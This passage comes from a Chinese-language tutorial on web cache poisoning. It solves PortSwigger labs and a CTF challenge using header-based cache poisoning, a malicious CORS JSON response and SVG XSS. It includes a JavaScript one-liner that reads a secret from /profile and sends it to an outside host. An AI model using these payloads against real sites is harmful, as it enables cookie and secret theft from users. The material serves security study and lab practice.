    {
        "country": "United Kingdom"
    }
我们可以通过构造`X-Forwarded-Host`字段来对data.host进行投毒。将js获取的json数据地址指定为我们的恶意地址。恶意内容写入到页面中造成XSS。
  * 构造Pyload
    {
        "country": ""
    }
需要注意的是，恶意服务器上需要设置CORS，不然js获取不了非同源的数据。
    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    Access-Control-Allow-Origin: *
  * 访问页面进行投毒
### 6、多个缓存投毒之间的配合
通过前面5个实验，我们了解到了不同方式的缓存投毒。但有些时候需要我们将多个不同方式的缓存投毒联系起来，互相配合。才能够有效的利用漏洞。
题目地址：[Lab: Combining web cache poisoning
vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting/lab-web-cache-poisoning-combining-vulnerabilities)
题目目标：插入XSS payload并弹出cookie。即：`alert(document.cookie)`
题目描述：某用户每分钟会通过自己的语言转换给English。
题目简要情况：
  1. 用户可以选择指定语言切换页面的语言
  2. 语言来自页面中js从后端读取的json数据
  3. 选择了语言后会访问/setlang/es接口，设置cookie。
  4. 主页中的js通过获取cookie中的值与json的值动态设置页面语言
题目里面的各个重要的点：
  1. 通过[Param Miner](https://github.com/portswigger/param-miner)工具可以发现两个可利用的字段。`X-Forwarded-Host`可以指定页面中data.host，后面用作json数据的域名。`X-Original-URL`可以使页面跳转到同域名的指定的url中去。
  2. 通过对js处理逻辑的分析，json中的en字段不能插入payload。其他语言可以通过设置"View details"来插入Payload。
  3. 两个比较重要的地址：
    * /setlang/es 设置语言，返回SetCookie头。
    * /?localized=1 设置完语言后所跳转的地址。
解题思路：
第一处投毒：
  1. 由于英文(en)不能设置payload，所以我们只能通过设置`X-Original-URL`强行让用户设置为其他类型的语言。
  2. 通过设置一种语言中的xsspayload，让用户强行跳转过来
第二处投毒：
  1. json数据页面的投毒，让用户读取到恶意的带有xss payload的数据。
解题：
  * 投毒主页让用户强行跳转到cn语言中
这里有个Trick就是`X-Original-URL`字段要设置为`/setlang\cn`，而不是`/setlang/cn`。这是因为后者跳转过去会有`Set-Cookie`字段，导致页面无法缓存。前者浏览器要先经过一个处理——将`\`转换为`/`。就不会有`Set-Cookie`字段了
  * 投毒/?localized=1 页面让用户读取到恶意数据
恶意数据的Header：
    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    Access-Control-Allow-Origin: *
恶意json数据：
    {
        "en": {
        "name": "English"
        },
        "cn": {
            "name": "a",
            "translations": {
                "Return to list": "123",
                "View details": "",
                "Description:": "456"
            }
        }
    }
可以使用Brupsuite持续的向这两个页面发送数据进行投毒，不然的话后端可能会访问不到。
## 四、使用缓存投毒来解CTF题
打算整理缓存投毒是因为这篇文章：[通过一道题了解缓存投毒和SVG XSS](https://xz.aliyun.com/t/4492)
这个CTF题也是文章里面的内容。我这里只记录一下简要的解题过程。
题目地址：
### 正常解题
构造SVG XSS Payload上传到服务器，将图片地址发送给管理员即可获得Flag。()
更简短的payload，通过正则匹配源码中的secret：
    fetch("/profile").then(function(e){e.text().then(function(f){new/**/Image().src='//avlidienbrunn.se/?'+/secret(.*)>/.exec(f)[0]})})
### 缓存投毒方式
这种方式比前面的要复杂，能够这样解题的原因有以下几点：
  1. 题目使用了cloudflare来作CDN缓存，会对js、img这类静态文件进行缓存
  2. 题目运行你设置任意的文件名，且个人信息页面为名称结尾。例如，我将文件名设置为Smi1e.js，则个人信息页面就是/profile/Smi1e.js。CDN会将其缓存
  3. 个人信息页面的鞋码处存在XSS
通过这几点就很容易构造出缓存投毒的payload，但是之前在缓存部分我们知道，缓存受到地区的限制，不同地区不会访问到同一个缓存。在构造和利用这个缓存投毒时，我们需要购买一个与题目环境相对应的服务器进行利用。这里就直接看下别人的exp吧：
整个exp利用的步骤如下：
  1. 页面上的 shoesize处存在xss，构造一个利用的数据包。
  2. 注册一个以.js的用户名
  3. 发送构造的数据包
  4. 访问/profile/name.js页面
  5. report地址
需要注意的是在这个题目环境当中，vary字段中的Cookie并没有生效。原因：
_理论上来说，网站可以使用“Vary”响应头来指定额外应该加入到缓存键中的其他请求头。在实践中，对Vary响应头的使用仅停留在理论阶段，像Cloudflare这样的CDN完全忽略它，大家甚至没有意识到他们的应用程序支持任何基于请求头的输入。  
——_
## 参考
  * [实战Web缓存投毒（上）](https://www.anquanke.com/post/id/156356)
  * [实战Web缓存投毒（下）](https://www.anquanke.com/post/id/156551)
  * [通过一道题了解缓存投毒和SVG XSS](https://xz.aliyun.com/t/4492)
  * [Web cache poisoning](https://portswigger.net/web-security/web-cache-poisoning)